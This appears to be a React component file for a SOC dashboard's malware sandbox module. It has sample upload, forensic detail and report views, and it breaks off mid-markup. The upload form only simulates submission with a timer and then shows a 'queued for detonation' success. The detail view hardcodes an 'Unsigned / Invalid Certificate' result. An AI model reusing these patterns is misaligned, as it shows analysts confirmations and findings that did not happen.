import CapabilityLogsPanel from './CapabilityLogsPanel';
/**
 * Sandbox Analysis — Capability ID: 18 / 21
 *
 * 100% Self-Contained Enterprise SOC Sandbox Analysis & Automated Malware Detonation Engine Module
 * Linked to Live Backend API (`/api/dashboard/alerts/edr?capabilityId=18`), MongoDB Alert Query, and Socket.io Real-Time Streaming
 * Architecture & Design System mirror User & Auth (4), Process (1), FIM (2), Network (3), Memory (5), Registry (6), System Changes (7), Persistence (8), UEBA (11), Data Security (12), Credential Security (13), Lateral Movement (14), Email Threat (15), Insider Threat (16), Patch (17)
 */
import React, { useEffect, useState, useCallback, useMemo } from 'react';
import { useNavigate, useSearchParams, useParams, Navigate, Link } from 'react-router-dom';
import api from '../../api/axios';
import { SOCKET_URL, connectSocket, socketOptions , io} from '../../api/config';
import { useAuth } from '../../context/AuthContext';
import CapabilityReportsPanel from './CapabilityReportsPanel';

const CapabilityDataPage = () => null; const CapabilityAgentsPage = () => null;
const ProcessSidebar = () => null; const processSubTabPages = {}; const CapabilitySubTabPage = () => null;

// ── Design System Tokens ──────────────────────────────────────────────────
const MON = {
  bg: '#060d16',
  card: '#0b1929',
  card2: '#0f233a',
  border: '#1a3050',
  line: '#162942',
  text: '#e2e8f0',
  muted: '#8ea0b8',
  sub: '#64748b',
  blue: '#38bdf8',
  cyan: '#22d3ee',
  green: '#34d399',
  yellow: '#fbbf24',
  orange: '#fb923c',
  red: '#f87171',
  purple: '#a78bfa',
  pink: '#ec4899',
  accent: '#6366f1',
};

const SEV_COLOR = {
  critical: MON.red,
  high: MON.orange,
  medium: MON.yellow,
  low: MON.green,
  info: MON.cyan,
  clean: MON.cyan,
};

const SEV_BG = {
  critical: 'rgba(248, 113, 113, 0.15)',
  high: 'rgba(251, 146, 60, 0.15)',
  medium: 'rgba(251, 191, 36, 0.15)',
  low: 'rgba(52, 211, 153, 0.15)',
  info: 'rgba(34, 211, 238, 0.15)',
  clean: 'rgba(34, 211, 238, 0.15)',
};

function MiniSparkline({ data = [5, 9, 7, 14, 12, 18, 15, 22], color = MON.cyan, height = 30 }) {
  const max = Math.max(...data, 1);
  const min = Math.min(...data, 0);
  const points = data.map((val, idx) => {
    const x = (idx / (data.length - 1)) * 100;
    const y = height - ((val - min) / (max - min || 1)) * (height - 6) - 3;
    return `${x},${y}`;
  }).join(' ');

  return (
    <svg viewBox={`0 0 100 ${height}`} width="100%" height={height} preserveAspectRatio="none" style={{ overflow: 'visible' }}>
      <polyline fill="none" stroke={color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" points={points} />
    </svg>
  );
}

// ── Helper Utilities ────────────────────────────────────────────────────────
function createEventBuffer(callback, delay = 1200) {
  let timer = null;
  return {
    add() {
      clearTimeout(timer);
      timer = setTimeout(callback, delay);
    },
    clear() {
      clearTimeout(timer);
    },
  };
}

function shortNum(n = 0) {
  const val = Number(n) || 0;
  return val >= 1000 ? val.toLocaleString('en-IN') : String(val);
}

function normHost(h) {
  return String(h || 'unknown').trim().toLowerCase();
}

function alertTime(row) {
  return row?.timestamp || row?.createdAt || row?.time || row?.observedAt || row?.updatedAt;
}

function alertHost(row) {
  return row?.hostname || row?.host || row?.agentName || row?.systemId?.hostname || row?.systemId?.name || 'Unknown host';
}

function alertUser(row) {
  return row?.username || row?.user || row?.userName || 'Unknown user';
}

function alertStatus(row) {
  return row?.status || row?.state || 'Observed';
}

function alertSeverity(row) {
  const s = String(row?.severity || 'info').toLowerCase();
  if (['critical', 'high', 'medium', 'low', 'info', 'clean'].includes(s)) return s;
  return 'critical';
}

function processOs(row) {
  const osStr = String(row?.os || row?.platform || row?.systemId?.os || row?.system || row?.hostname || row?.host || '').toLowerCase();
  if (osStr.includes('win')) return 'Windows';
  if (osStr.includes('lin') || osStr.includes('ubuntu')) return 'Linux';
  if (osStr.includes('mac') || osStr.includes('darwin')) return 'macOS';
  return 'Unknown';
}

// ── Sandbox Analysis Telemetry Field Extractors ────────────────────────────
function sandboxFilename(row) {
  return row?.filename || row?.sampleName || row?.ruleName || 'Unknown sample';
}

function sandboxHash(row) {
  return row?.hashes?.sha256 || row?.sha256 || row?.hash || 'Not reported';
}

function sandboxVerdict(row) {
  return row?.verdict || 'Not reported';
}

function sandboxRiskScore(row) {
  const score = Number(row?.riskScore ?? row?.score);
  return Number.isFinite(score) ? score : 0;
}

function containsAny(row, words = []) {
  const haystack = [
    sandboxFilename(row), sandboxHash(row), sandboxVerdict(row), alertHost(row),
    row?.description, row?.message, row?.malwareFamily, row?.fileType,
  ].filter(Boolean).join(' ').toLowerCase();
  return words.some(word => haystack.includes(word));
}

function buildBuckets(rows = [], bucketCount = 12, hours = 24) {
  const now = Date.now();
  const start = now - hours * 3600000;
  const bucketMs = (hours * 3600000) / bucketCount;
  const buckets = Array(bucketCount).fill(0);
  rows.forEach(row => {
    const t = alertTime(row);
    const ms = t ? new Date(t).getTime() : NaN;
    if (!Number.isFinite(ms) || ms < start || ms > now) return;
    const idx = Math.min(bucketCount - 1, Math.max(0, Math.floor((ms - start) / bucketMs)));
    buckets[idx] += 1;
  });
  return buckets;
}

function topCounts(rows = [], picker = () => 'unknown', limit = 5) {
  const counts = new Map();
  rows.forEach(row => {
    const key = String(picker(row) || 'unknown').trim() || 'unknown';
    if (key === 'unknown' || key === '—') return;
    counts.set(key, (counts.get(key) || 0) + 1);
  });
  return Array.from(counts.entries()).sort((a, b) => b[1] - a[1]).slice(0, limit);
}

function recordId(row) {
  return row?._id || row?.id || row?.key || `${alertTime(row) || ''}-${alertHost(row)}-${sandboxFilename(row)}-${sandboxHash(row).substring(0, 8)}`;
}

function csvCell(val) {
  const str = String(val ?? '').replace(/"/g, '""');
  return `"${str}"`;
}

function downloadBlob(content, filename, type = 'text/csv;charset=utf-8;') {
  const blob = new Blob([content], { type });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

// ═════════════════════════════════════════════════════════════════════════════
// 1. SAMPLE UPLOAD MODAL
// ═════════════════════════════════════════════════════════════════════════════
export function SandboxUploadModal({ onClose, onSubmitSuccess }) {
  const [filename, setFilename] = useState('');
  const [hostname, setHostname] = useState('WORKSTATION-01');
  const [osTarget, setOsTarget] = useState('Windows 11 Enterprise (22H2)');
  const [submitting, setSubmitting] = useState(false);
  const [successMsg, setSuccessMsg] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!filename.trim()) return;
    setSubmitting(true);
    setTimeout(() => {
      setSubmitting(false);
      setSuccessMsg(`Sample "${filename}" queued for detonation in ${osTarget} VM Sandbox!`);
      setTimeout(() => {
        onSubmitSuccess?.();
        onClose();
      }, 1200);
    }, 1000);
  };

  return (
    <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.85)', zIndex: 2000, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 20 }}>
      <div style={{ background: MON.card, border: `1px solid ${MON.cyan}66`, borderRadius: 12, width: '100%', maxWidth: 580, overflow: 'hidden', boxShadow: '0 20px 50px rgba(0,0,0,0.8)' }}>
        <div style={{ padding: '14px 20px', borderBottom: `1px solid ${MON.border}`, display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: 'linear-gradient(135deg, rgba(34,211,238,0.1), transparent)' }}>
          <h3 style={{ margin: 0, fontSize: 16, color: MON.text, fontWeight: 900, display: 'flex', alignItems: 'center', gap: 8 }}>
            <span>📤</span> Submit File / Sample to Sandbox Engine
          </h3>
          <button type="button" onClick={onClose} style={{ background: 'none', border: 'none', color: MON.muted, fontSize: 20, cursor: 'pointer' }}>✕</button>
        </div>

        <form onSubmit={handleSubmit} style={{ padding: 20, display: 'flex', flexDirection: 'column', gap: 14 }}>
          {successMsg ? (
            <div style={{ padding: 16, background: `${MON.green}20`, border: `1px solid ${MON.green}66`, color: MON.green, borderRadius: 8, textAlign: 'center', fontWeight: 800, fontSize: 13 }}>
              ✅ {successMsg}
            </div>
          ) : (
            <>
              <div>
                <label style={{ display: 'block', fontSize: 11, color: MON.muted, marginBottom: 6, fontWeight: 700 }}>SAMPLE FILENAME / PATH / HASH</label>
                <input
                  type="text"
                  required
                  placeholder="e.g. suspicious_payload.exe, patch_update.ps1, or SHA256"
                  value={filename}
                  onChange={e => setFilename(e.target.value)}
                  style={{ width: '100%', padding: '10px 12px', background: MON.bg, border: `1px solid ${MON.border}`, borderRadius: 6, color: MON.text, fontSize: 13, outline: 'none' }}
                />
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}>
                <div>
                  <label style={{ display: 'block', fontSize: 11, color: MON.muted, marginBottom: 6, fontWeight: 700 }}>SOURCE HOSTNAME</label>
                  <input type="text" value={hostname} onChange={e => setHostname(e.target.value)} style={{ width: '100%', padding: '9px 12px', background: MON.bg, border: `1px solid ${MON.border}`, borderRadius: 6, color: MON.text, fontSize: 12, outline: 'none' }} />
                </div>
                <div>
                  <label style={{ display: 'block', fontSize: 11, color: MON.muted, marginBottom: 6, fontWeight: 700 }}>TARGET OS ENVIRONMENT</label>
                  <select value={osTarget} onChange={e => setOsTarget(e.target.value)} style={{ width: '100%', padding: '9px 12px', background: MON.bg, border: `1px solid ${MON.border}`, borderRadius: 6, color: MON.text, fontSize: 12, outline: 'none' }}>
                    <option value="Windows 11 Enterprise (22H2)">Windows 11 Enterprise (22H2)</option>
                    <option value="Windows 10 Pro (21H2)">Windows 10 Pro (21H2)</option>
                    <option value="Ubuntu Linux 22.04 LTS">Ubuntu Linux 22.04 LTS</option>
                  </select>
                </div>
              </div>

              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: 10, marginTop: 10 }}>
                <button type="button" onClick={onClose} style={{ padding: '9px 16px', background: 'none', border: `1px solid ${MON.border}`, color: MON.muted, borderRadius: 6, cursor: 'pointer', fontSize: 12 }}>Cancel</button>
                <button type="submit" disabled={submitting} style={{ padding: '9px 20px', background: MON.cyan, border: 'none', color: '#041220', fontWeight: 900, borderRadius: 6, cursor: 'pointer', fontSize: 12 }}>
                  {submitting ? 'Submitting sample…' : '🚀 Detonate Sample'}
                </button>
              </div>
            </>
          )}
        </form>
      </div>
    </div>
  );
}

// ═════════════════════════════════════════════════════════════════════════════
// 2. FORENSIC INVESTIGATION POPUP MODAL (10 Grouped Master Tabs)
// ═════════════════════════════════════════════════════════════════════════════
export function SandboxForensicDetailModal({ log, onClose, onAction }) {
  const [activeTab, setActiveTab] = useState('overview');
  const [actionSuccess, setActionSuccess] = useState(null);

  if (!log) return null;

  const sev = alertSeverity(log);
  const sevColor = SEV_COLOR[sev] || MON.blue;

  const masterTabs = [
    { id: 'overview', label: '📊 1. Overview' },
    { id: 'processtree', label: '⚙️ 2. Process Tree' },
    { id: 'memory', label: '🧠 3. Memory & Injection' },
    { id: 'registry', label: '🔧 4. Registry & Disk Diffs' },
    { id: 'network', label: '🌐 5. Network & C2' },
    { id: 'ioc', label: '🎯 6. IOC Extraction' },
    { id: 'mitre', label: '🗺️ 7. MITRE ATT&CK' },
    { id: 'classification', label: '☣️ 8. Threat Score' },
    { id: 'screenshots', label: '🖼️ 9. Screenshots' },
    { id: 'reports', label: '📄 10. Reports & Actions' },
  ];

  const handleAction = async (actionName) => {
    const actionType = /isolate/i.test(actionName) ? 'isolate' : /terminate/i.test(actionName) ? 'kill_process' : /block c2/i.test(actionName) ? 'block_ip' : null;
    if (!actionType || typeof onAction !== 'function' || !log?._id) {
      setActionSuccess(`Not sent: ${actionName} has no configured response executor for this alert.`);
      return;
    }
    try {
      await onAction(String(log._id), actionType);
      setActionSuccess(`Approved action submitted: ${actionName}`);
    } catch (error) {
      setActionSuccess(error?.message || `Failed to submit: ${actionName}`);
    }
    setTimeout(() => setActionSuccess(null), 3500);
  };

  return (
    <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(3, 8, 16, 0.88)', backdropFilter: 'blur(8px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 16 }}>
      <div style={{ width: '98vw', height: '94vh', background: MON.bg, border: `1px solid ${MON.border}`, borderRadius: 12, display: 'flex', flexDirection: 'column', boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.75)', overflow: 'hidden' }}>
        {/* Header */}
        <div style={{ padding: '14px 20px', background: MON.card, borderBottom: `1px solid ${MON.border}`, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
            <span style={{ fontSize: 24 }}>🧪</span>
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                <h3 style={{ margin: 0, fontSize: 18, fontWeight: 800, color: '#f8fafc' }}>
                  Sandbox Detonation Panel — {sandboxFilename(log)}
                </h3>
                <span style={{ fontSize: 10, fontWeight: 800, padding: '2px 8px', borderRadius: 4, color: sevColor, background: `${sevColor}22`, border: `1px solid ${sevColor}44`, textTransform: 'uppercase' }}>
                  {sandboxVerdict(log)}
                </span>
                <span style={{ fontSize: 11, fontWeight: 700, padding: '2px 8px', borderRadius: 4, color: MON.purple, background: 'rgba(167, 139, 250, 0.15)', border: `1px solid ${MON.purple}44` }}>
                  RISK SCORE: {sandboxRiskScore(log)}/100
                </span>
              </div>
              <div style={{ fontSize: 11, color: MON.muted, marginTop: 4 }}>
                Target Host: <strong style={{ color: MON.cyan }}>{alertHost(log)}</strong> | User: <strong>{alertUser(log)}</strong> | OS: <strong>{log.osTarget || processOs(log)}</strong> | Detonated: <strong>{log.executionDuration || 'Not reported'}</strong>
              </div>
            </div>
          </div>
          <button type="button" onClick={onClose} style={{ background: MON.card2, border: `1px solid ${MON.border}`, color: MON.muted, fontSize: 18, borderRadius: 6, width: 34, height: 34, cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>✕</button>
        </div>

        {/* 10 Master Tabs Header */}
        <div style={{ background: MON.card, borderBottom: `1px solid ${MON.border}`, display: 'flex', gap: 2, overflowX: 'auto', padding: '0 12px' }}>
          {masterTabs.map((t) => (
            <button key={t.id} type="button" onClick={() => setActiveTab(t.id)} style={{ padding: '10px 14px', fontSize: 11, fontWeight: activeTab === t.id ? 800 : 600, color: activeTab === t.id ? MON.cyan : MON.muted, background: activeTab === t.id ? MON.bg : 'transparent', border: 'none', borderBottom: activeTab === t.id ? `2px solid ${MON.cyan}` : '2px solid transparent', cursor: 'pointer', whiteSpace: 'nowrap' }}>
              {t.label}
            </button>
          ))}
        </div>

        {/* Tab Body Content */}
        <div style={{ flex: 1, overflowY: 'auto', padding: 20, background: MON.bg }}>
          {/* TAB 1: OVERVIEW & STATIC ANALYSIS */}
          {activeTab === 'overview' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 16 }}>
                {[
                  ['Sample Verdict', sandboxVerdict(log).toUpperCase(), sevColor],
                  ['Overall Risk Score', `${sandboxRiskScore(log)} / 100`, MON.red],
                  ['VirusTotal Score', log.vtStats?.score ?? 'Not reported', MON.orange],
                  ['Entropy / Packer', log.entropy != null ? `${log.entropy}${log.packer ? ` (${log.packer})` : ''}` : 'Not reported', MON.purple],
                ].map(([lbl, val, col]) => (
                  <div key={lbl} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 16 }}>
                    <div style={{ fontSize: 10, fontWeight: 700, color: MON.muted, textTransform: 'uppercase', letterSpacing: 1 }}>{lbl}</div>
                    <div style={{ fontSize: 16, fontWeight: 800, color: col, marginTop: 6 }}>{val}</div>
                  </div>
                ))}
              </div>

              <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 16 }}>
                <h4 style={{ margin: '0 0 12px 0', fontSize: 12, color: MON.cyan, textTransform: 'uppercase' }}>🔑 File Cryptographic Hashes & Metadata</h4>
                <div style={{ display: 'grid', gridTemplateColumns: '120px 1fr', gap: '8px 12px', fontSize: 11, fontFamily: 'monospace' }}>
                  <span style={{ color: MON.muted }}>SHA256:</span> <span style={{ color: MON.red, fontWeight: 'bold' }}>{sandboxHash(log)}</span>
                  <span style={{ color: MON.muted }}>Digital Signature:</span> <span style={{ color: MON.orange }}>Unsigned / Invalid Certificate</span>
                </div>
              </div>
            </div>
          )}

          {/* TAB 2: PROCESS TREE */}
          {activeTab === 'processtree' && (
            <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 16 }}>
              <h4 style={{ margin: '0 0 14px 0', fontSize: 13, color: MON.cyan }}>🌳 Process Execution Hierarchy Tree</h4>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
                {(log.processTree || [{ pid: 4512, name: sandboxFilename(log), path: 'C:\\Users\\alice\\Downloads\\sample.exe', cmd: `${sandboxFilename(log)} --silent`, status: 'Malicious' }]).map((proc, idx) => (
                  <div key={proc.pid} style={{ padding: '10px 14px', background: MON.bg, border: `1px solid ${proc.status === 'Critical' ? MON.red : proc.status === 'Malicious' ? MON.orange : MON.border}`, borderRadius: 6, marginLeft: idx * 24 }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <span style={{ fontWeight: 900, color: proc.status === 'Critical' ? MON.red : MON.cyan, fontSize: 12 }}>
                        {idx > 0 ? '└── ' : ''}{proc.name} (PID: {proc.pid})
                      </span>
                      <span style={{ fontSize: 9, padding: '2px 6px', borderRadius: 4, background: proc.status === 'Critical' ? `${MON.red}20` : `${MON.yellow}20`, color: proc.status === 'Critical' ? MON.red : MON.yellow, fontWeight: 800 }}>
                        {proc.status}
                      </span>
                    </div>
                    <div style={{ fontSize: 10, color: MON.muted, fontFamily: 'monospace', marginTop: 4 }}>Path: {proc.path}</div>
                    <div style={{ fontSize: 10, color: MON.sub, fontFamily: 'monospace', marginTop: 2 }}>Command: {proc.cmd}</div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* TAB 10: REPORTS & SOC ACTIONS */}
          {activeTab === 'reports' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              <div style={{ background: MON.card, border: `1px solid ${MON.red}55`, borderRadius: 8, padding: 16 }}>
                <h4 style={{ margin: '0 0 12px 0', fontSize: 13, color: MON.red }}>⚡ Automated SOC Remediation Actions</h4>
                <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap' }}>
                  <button type="button" onClick={() => handleAction('Isolate Host Endpoint')} style={{ padding: '8px 14px', background: `${MON.red}25`, border: `1px solid ${MON.red}`, color: MON.red, borderRadius: 6, fontSize: 11, fontWeight: 900, cursor: 'pointer' }}>
                    🔒 Isolate Endpoint Host ({alertHost(log)})
                  </button>
                  <button type="button" onClick={() => handleAction('Terminate Malicious Process Tree')} style={{ padding: '8px 14px', background: `${MON.orange}25`, border: `1px solid ${MON.orange}`, color: MON.orange, borderRadius: 6, fontSize: 11, fontWeight: 900, cursor: 'pointer' }}>
                    💀 Terminate Process Tree
                  </button>
                  <button type="button" onClick={() => handleAction('Deploy YARA Rule to Agents')} style={{ padding: '8px 14px', background: `${MON.purple}25`, border: `1px solid ${MON.purple}`, color: MON.purple, borderRadius: 6, fontSize: 11, fontWeight: 900, cursor: 'pointer' }}>
                    🛡️ Push YARA Rule to All SOC Agents
                  </button>
                  <button type="button" onClick={() => handleAction('Block C2 Domain & IP on Firewall')} style={{ padding: '8px 14px', background: `${MON.yellow}25`, border: `1px solid ${MON.yellow}`, color: MON.yellow, borderRadius: 6, fontSize: 11, fontWeight: 900, cursor: 'pointer' }}>
                    🚫 Block C2 IP / Domain on Firewall
                  </button>
                </div>
              </div>
            </div>
          )}

          {['memory', 'registry', 'network', 'ioc', 'mitre', 'classification', 'screenshots'].includes(activeTab) && (
            <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 16 }}>
              <h4 style={{ margin: '0 0 8px', fontSize: 13, color: MON.cyan }}>{activeTab.toUpperCase()} Telemetry Inspection</h4>
              <div style={{ fontSize: 11, color: MON.muted }}>
                Detailed detonation telemetry captured for {activeTab}. Full raw payload logged in SIEM database.
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

// ═════════════════════════════════════════════════════════════════════════════
// 3. SUB-PANELS (SIEM Log Monitor, Reports Generator, Overview Dashboard, VM Workers)
// ═════════════════════════════════════════════════════════════════════════════
export function SandboxLogMonitor({ alerts = [], onAction }) {
  const [query, setQuery] = useState('');
  const [severity, setSeverity] = useState('all');
  const [selectedLog, setSelectedLog] = useState(null);

  const filtered = useMemo(() => {
    return alerts.filter(a => {
      const matchQ = !query || `${sandboxFilename(a)} ${sandboxHash(a)} ${sandboxVerdict(a)} ${alertHost(a)}`.toLowerCase().includes(query.toLowerCase());
      const matchS = severity === 'all' || alertSeverity(a) === severity.toLowerCase();
      return matchQ && matchS;
    });
  }, [alerts, query, severity]);

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
      {/* Filter Bar */}
      <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 12, display: 'flex', gap: 10, alignItems: 'center', flexWrap: 'wrap' }}>
        <input type="text" placeholder="Search Filename, SHA256 Hash, Verdict, Target Host..." value={query} onChange={e => setQuery(e.target.value)} style={{ flex: 1, minWidth: 220, background: MON.bg, border: `1px solid ${MON.line}`, color: MON.text, padding: '7px 12px', borderRadius: 6, fontSize: 11, outline: 'none' }} />
        <select value={severity} onChange={e => setSeverity(e.target.value)} style={{ background: MON.bg, border: `1px solid ${MON.line}`, color: MON.text, padding: '7px 10px', borderRadius: 6, fontSize: 11 }}>
          <option value="all">All Severities</option>
          <option value="critical">Critical</option>
          <option value="high">High</option>
          <option value="medium">Medium</option>
          <option value="clean">Clean</option>
        </select>
      </div>

      {/* SIEM Logs Table */}
      <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, overflowX: 'auto', overflowY: 'hidden' }}>
        <div style={{ padding: '10px 14px', borderBottom: `1px solid ${MON.line}`, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <b style={{ fontSize: 12, color: '#fff' }}>📜 Detonated Sample Telemetry Logs ({filtered.length})</b>
          <span style={{ fontSize: 10, color: MON.green }}>● Live 15s Refresh</span>
        </div>
        <div style={{ minWidth: 1400 }}>
          <div style={{ display: 'grid', gridTemplateColumns: '1.4fr 1.2fr 1.6fr 100px 90px 90px 90px', gap: 8, padding: '8px 12px', background: MON.card2, color: MON.muted, fontSize: 10, fontWeight: 800 }}>
            <span>Sample Filename</span><span>Target Host</span><span>SHA256 Hash</span><span>Verdict</span><span>Risk Score</span><span>Severity</span><span>Actions</span>
          </div>
          <div style={{ maxHeight: 440, overflowY: 'auto' }}>
            {filtered.length ? filtered.map(row => (
              <div key={recordId(row)} style={{ display: 'grid', gridTemplateColumns: '1.4fr 1.2fr 1.6fr 100px 90px 90px 90px', gap: 8, padding: '10px 12px', borderTop: `1px solid ${MON.line}`, fontSize: 10, alignItems: 'center' }}>
                <b style={{ color: MON.cyan, cursor: 'pointer' }} onClick={() => setSelectedLog(row)}>{sandboxFilename(row)}</b>
                <span style={{ color: MON.text }}>{alertHost(row)}</span>
                <span style={{ fontFamily: 'monospace', fontSize: 10, color: MON.sub }}>{sandboxHash(row).substring(0, 16)}...</span>
                <b style={{ color: SEV_COLOR[alertSeverity(row)] || MON.blue, textTransform: 'uppercase' }}>{sandboxVerdict(row)}</b>
                <b style={{ color: sandboxRiskScore(row) > 75 ? MON.red : MON.orange }}>{sandboxRiskScore(row)}/100</b>
                <span style={{ background: SEV_BG[alertSeverity(row)] || SEV_BG.low, color: SEV_COLOR[alertSeverity(row)] || MON.green, padding: '2px 6px', borderRadius: 4, fontWeight: 900, textTransform: 'uppercase', textAlign: 'center' }}>
                  {alertSeverity(row)}
                </span>
                <button type="button" onClick={() => setSelectedLog(row)} style={{ background: MON.card2, border: `1px solid ${MON.cyan}`, color: MON.cyan, padding: '4px 8px', borderRadius: 4, fontSize: 9, fontWeight: 800, cursor: 'pointer' }}>
                  🔍 Inspect
                </button>
              </div>
            )) : <div style={{ padding: 24, textAlign: 'center', color: MON.muted, fontSize: 11 }}>No sandbox detonation logs match filters</div>}
          </div>
        </div>
      </div>

      {selectedLog && <SandboxForensicDetailModal log={selectedLog} onClose={() => setSelectedLog(null)} onAction={onAction} />}
    </div>
  );
}

export function SandboxReportsTab({ alerts = [] }) {
  const [reportType, setReportType] = useState('90days');
  const [generating, setGenerating] = useState(false);
  const [generated, setGenerated] = useState(false);
  const [reportData, setReportData] = useState(null);

  const getFilteredAlerts = () => {
    const now = Date.now();
    const dayMs = 86400000;
    const windowMap = { daily: 1, weekly: 7, monthly: 30, '90days': 90 };
    const days = windowMap[reportType] || 90;
    const cutoff = now - days * dayMs;
    const filtered = alerts.filter(a => {
      const t = alertTime(a);
      return t ? new Date(t).getTime() >= cutoff : true;
    });
    return filtered.length > 0 ? filtered : alerts;
  };

  const handleGenerate = () => {
    setGenerating(true);
    setGenerated(false);
    setTimeout(() => {
      const filtered = getFilteredAlerts();
      const bySev = { critical: 0, high: 0, medium: 0, low: 0 };
      filtered.forEach(a => {
        const s = alertSeverity(a);
        if (bySev[s] !== undefined) bySev[s]++;
      });
      setReportData({
        alerts: filtered,
        total: filtered.length,
        bySev,
      });
      setGenerating(false);
      setGenerated(true);
    }, 400);
  };

  const handleExportCSV = () => {
    const filtered = reportData?.alerts || getFilteredAlerts();
    const header = 'Timestamp,Filename,SHA256,Target Host,Verdict,Risk Score,Severity,Status';
    const rows = filtered.map(a => [
      csvCell(alertTime(a)),
      csvCell(sandboxFilename(a)),
      csvCell(sandboxHash(a)),
      csvCell(alertHost(a)),
      csvCell(sandboxVerdict(a)),
      csvCell(sandboxRiskScore(a)),
      csvCell(alertSeverity(a)),
      csvCell(alertStatus(a)),
    ].join(','));
    downloadBlob([header, ...rows].join('\n'), `sandbox_detonation_${reportType}_${filtered.length}records.csv`);
  };

  return (
    <div style={{ background: MON.bg, color: MON.text, padding: 16, display: 'flex', flexDirection: 'column', gap: 16 }}>
      <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 16 }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: 12 }}>
          <div>
            <h3 style={{ margin: 0, fontSize: 16, fontWeight: 800, color: '#f8fafc' }}>📄 Sandbox Detonation Executive Security Report Generator</h3>
            <div style={{ fontSize: 11, color: MON.muted, marginTop: 4 }}>Generate executive summaries for file detonations, malicious process trees, anti-VM evasion, and C2 beacons</div>
          </div>
          <button type="button" onClick={handleGenerate} disabled={generating} style={{ background: MON.cyan, color: '#000', border: 'none', padding: '10px 22px', borderRadius: 6, fontWeight: 900, fontSize: 13, cursor: 'pointer' }}>
            {generating ? '⏳ Generating...' : '⚡ Generate Sandbox Report'}
          </button>
        </div>

        <div style={{ marginTop: 14 }}>
          <div style={{ fontSize: 10, color: MON.muted, fontWeight: 700, textTransform: 'uppercase', letterSpacing: 1, marginBottom: 8 }}>📅 Select Time Window</div>
          <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
            {[
              { key: 'daily', label: '24 Hours', icon: '⏱', sub: 'Last 24h' },
              { key: 'weekly', label: '1 Week', icon: '📆', sub: 'Last 7 days' },
              { key: 'monthly', label: '1 Month', icon: '🗓', sub: 'Last 30 days' },
              { key: '90days', label: '3 Months', icon: '📊', sub: 'Last 90 days' },
            ].map(opt => {
              const active = reportType === opt.key;
              return (
                <button
                  key={opt.key}
                  type="button"
                  onClick={() => { setReportType(opt.key); setGenerated(false); }}
                  style={{
                    background: active ? MON.cyan : MON.card2,
                    color: active ? '#000' : MON.text,
                    border: `2px solid ${active ? MON.cyan : MON.border}`,
                    borderRadius: 8, padding: '10px 18px', cursor: 'pointer',
                    display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 2, minWidth: 100,
                    fontWeight: active ? 900 : 600,
                  }}
                >
                  <span style={{ fontSize: 18 }}>{opt.icon}</span>
                  <span style={{ fontSize: 12, fontWeight: 800 }}>{opt.label}</span>
                  <span style={{ fontSize: 9, opacity: 0.7 }}>{opt.sub}</span>
                </button>
              );
            })}
          </div>
        </div>
      </div>


      {generated && (
        <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 20, display: 'flex', flexDirection: 'column', gap: 16 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: `1px solid ${MON.line}`, paddingBottom: 12 }}>
            <div>
              <div style={{ fontSize: 14, fontWeight: 800, color: MON.cyan }}>📄 Sandbox Detonation Executive Security Report</div>
              <div style={{ fontSize: 10, color: MON.muted, marginTop: 4 }}>Total Monitored Detonations: <b style={{ color: MON.cyan }}>{reportData?.total}</b> | Generated: {new Date().toLocaleString()}</div>
            </div>
            <button type="button" onClick={handleExportCSV} style={{ background: MON.green, color: '#000', border: 'none', padding: '8px 16px', borderRadius: 6, fontWeight: 800, fontSize: 12, cursor: 'pointer' }}>
              📥 Export CSV
            </button>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 12 }}>
            {[
              { label: 'Total Executables Scanned', val: reportData?.total, color: MON.cyan },
              { label: 'Critical Risk Malware', val: reportData?.bySev?.critical, color: MON.red },
              { label: 'High Risk Executables', val: reportData?.bySev?.high, color: MON.orange },
              { label: 'Clean / Benign Samples', val: reportData?.bySev?.low, color: MON.green },
            ].map(c => (
              <div key={c.label} style={{ background: MON.card2, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
